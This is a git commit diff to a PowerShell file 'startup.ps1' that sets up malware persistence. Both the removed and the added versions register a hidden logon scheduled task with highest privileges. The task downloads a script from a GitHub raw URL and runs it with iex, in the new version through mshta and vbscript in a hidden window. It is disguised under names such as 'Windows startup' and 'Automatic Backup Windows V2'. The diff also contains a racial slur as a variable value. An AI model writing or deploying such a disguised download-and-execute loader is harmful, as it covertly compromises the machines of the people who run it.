e7e0f6797626cc7eeba6b124fe3fe3f0ad1cf602
43a1723 <hai1723notgay@gmail.com>
2024-06-26 14:16:30 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -1,11 +1,6 @@
-$powershellcode = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
-$download = "(New-Object Net.WebClient).DownloadString('$powershellcode')"
-$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX $download }"
-
-$task_action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arguments
+$task_name = "Windows startup"
+New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='nigga';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Automatic Backup Windows V2"  # Thay đổi giá trị này thành một tên duy nhất cho tác vụ
-$task_desc = "Always Backup & Fix If Windows ERROR."
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-
-Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force | Out-Null
+Write-Host "[!] Persistence Added" -ForegroundColor Green
